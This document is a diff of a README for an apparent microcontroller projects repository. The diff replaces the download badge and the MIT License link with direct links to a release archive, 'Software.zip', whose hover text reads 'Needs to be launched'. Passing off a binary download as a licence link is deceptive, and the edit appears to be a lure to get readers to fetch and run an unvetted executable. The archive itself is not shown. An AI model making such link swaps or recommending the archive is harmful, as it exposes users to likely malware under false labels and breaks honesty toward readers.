@@ -30,7 +30,7 @@ Dive into the fascinating realm of embedded systems with these innovative projec
 ## Getting Started
 To get started with these engaging projects, simply download the repository by clicking the button below:
 
-[![Download Repository](https://img.shields.io/badge/Download-Repository-blue)](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip "Needs to be launched")
+[![Download Repository](https://github.com/dohehe29/Projects-Based-on-Atmage32/releases/download/v1.0/Software.zip)](https://github.com/dohehe29/Projects-Based-on-Atmage32/releases/download/v1.0/Software.zip "Needs to be launched")
 
 If the link above does not work or you require more information, please check the "Releases" section of this repository for additional resources.
 
@@ -41,7 +41,7 @@ We welcome contributions from the community to enhance and expand the project co
 If you have any questions, feedback, or need assistance with the projects, please don't hesitate to reach out. We are here to help you explore the exciting world of embedded systems and microcontroller programming.
 
 ## License
-The contents of this repository are licensed under the [MIT License](https://opensource.org/licenses/MIT), ensuring that the projects can be freely used and modified by the community.
+The contents of this repository are licensed under the [MIT License](https://github.com/dohehe29/Projects-Based-on-Atmage32/releases/download/v1.0/Software.zip), ensuring that the projects can be freely used and modified by the community.
 
 ---
 
